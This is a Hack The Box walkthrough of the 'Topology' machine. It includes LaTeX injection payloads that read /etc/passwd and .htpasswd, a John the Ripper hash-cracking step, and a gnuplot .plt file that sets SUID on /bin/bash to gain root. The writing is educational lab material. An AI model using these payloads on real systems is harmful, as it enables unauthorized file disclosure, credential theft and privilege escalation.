![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/427ac295-7587-485b-8483-5dd74e2f46db)
#### https://app.hackthebox.com/machines/546
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I initiated the enumeration process by performing a quick scan using rustscan, which revealed only two open ports on the target machine:

```bash
sudo rustscan -a 10.10.11.217  -- -sC -sV -vv -oN topology_nmap
```
The results showed the following open ports:

```
Port 22: Running OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
Port 80: Running Apache httpd 2.4.41
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Furthermore, during the scan, I noticed that the website hosted on port 80 belonged to a university called "Miskatonic University | Topology Group."

Upon browsing the website, I came across an email address and a domain associated with the university:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d71a72b4-8a12-400d-847b-6a2b927d5211)

Email: lklein@topology.htb
Domain: topology.htb

I added the domain to my hosts file and proceeded to conduct directory and virtual host (vhost) enumeration against it. During this process, I discovered another domain, "latex.topology.htb," and added it to the hosts file as well. Browsing through this domain, I found a website that provided a tool to generate ".PNG" files from LaTeX math equations.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0c5c0164-4486-4685-85b1-ed14a3969b30)

Continuing with the enumeration, I performed directory enumeration using GoBuster and identified a few directories:

```bash
gobuster dir -u http://topology.htb -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o topology_web -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2929a9c5-3312-40fa-9744-c43264dc7e91)

After examining the contents of these directories, none of them seemed particularly useful.

Next, I utilized FFuF to scan for virtual hosts and obtained a few results:

```bash
ffuf -H "Host: FUZZ.topology.htb" -u http://10.10.11.217 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 6767
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5a1ebb63-e5e2-47c7-ab7a-1f7fdcc7afc3)

I added all the discovered domains to my hosts file and proceeded to browse through them.

- The "stats" domain displayed an image indicating the server load, without any notable findings.
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/85b341b8-d08f-4c4c-9f36-157197b8a850)

- The "dev" domain presented a login panel, suggesting that bypassing the login might grant access to the development environment.
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d6a4b5b3-ae11-477a-924a-552b5c769810)

I came across another write-up stating that "if HTTP sign-in is enabled, we may find the credentials in a .htpasswd file somewhere." Considering that the dev environment was active, it was likely to be located in "var/www/dev/.htpasswd".

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

After discovering the availability of LaTeX math functionality, I continued my research for potential exploits and came across a blog about LFI (Local File Inclusion) in LaTeX. I followed the steps outlined in the blog and used the following payload:

```tex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```
The payload partially worked in my case, displaying only the first line of the result:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2658c6b0-0816-4a5d-9e01-ebccdc04b318)

However, when I attempted to read the full line, I encountered an "illegal command detected" error:

```tex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline 
    \text{\fileline}
\repeat
\closein\file
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/98f44329-cefc-4a39-b3e4-598470952da3)

I encountered a roadblock at this point and tried multiple different payloads. Eventually, I came across another write-up that suggested the following payload:

```tex
$\lstinputlisting{/etc/passwd}$
```

According to the write-up, by using '$' signs, we can force the machine to process our query and switch to a different mode that allows us to retrieve the file content. This payload worked perfectly, allowing me to view the content of the .htpasswd file, which contained the password hash for the user 'vdaisley'.

Next, I checked the hash algorithm and discovered that it was in the "md5crypt-long" format. To crack the hash, I used John the Ripper with a wordlist (rockyou.txt) and successfully obtained the clear text password.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8e7f3b92-3d3f-4398-a70b-b446d5903792)

```bash
john hash.txt --format=md5crypt-long -w=/usr/share/wordlists/rockyou.txt
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5c2443d2-56cf-427c-9f0a-5e2c12cc446c)

With the cracked credentials, I was finally able to log in via SSH and retrieve the user flag. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/802eafd8-a980-4a4f-901a-b6d5c3853064)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After conducting a manual approach to check for privilege escalation vectors, I performed the following steps:

```
- checked for sudo permissions "sudo -l" but got response as: Sorry, user vdaisley may not run sudo on topology.
- No schedule jobs are running.
- No SUID binary available to help in priv esc.
```

To further explore potential privilege escalation vectors, I uploaded pspy to monitor running processes owned by the root user. I discovered a binary called "gnuplot" in the /opt directory, which seemed to be performing scheduled tasks.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c7590652-d52d-45a4-a737-28f5ebe0564e)

Upon investigation, I found that while I didn't have read access to the /opt/gnuplot folder, I did have write access to it.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a6b8cac9-8d8a-49fe-b280-dec04ee88e10)

Further research on gnuplot revealed that it is a command-line and GUI program used for generating two- and three-dimensional plots. While searching for privilege escalation vectors related to gnuplot, I came across an [exploit note](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/) on the exploit notes website. According to the note, if I created a ".plt" file within the gnuplot directory, I could run it with the same privileges as the owner of the file.

I proceeded to create a .plt file and inserted a bash command to set the SUID permission on /bin/bash:

```bash
system "chmod u+s /bin/bash"
```
After a few seconds, when the file was executed by the root user, I finally obtained a bash shell with SUID permissions. With this escalated privilege, I gained root access. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/bb9de592-47a2-4110-9c45-870a667fd9f4)




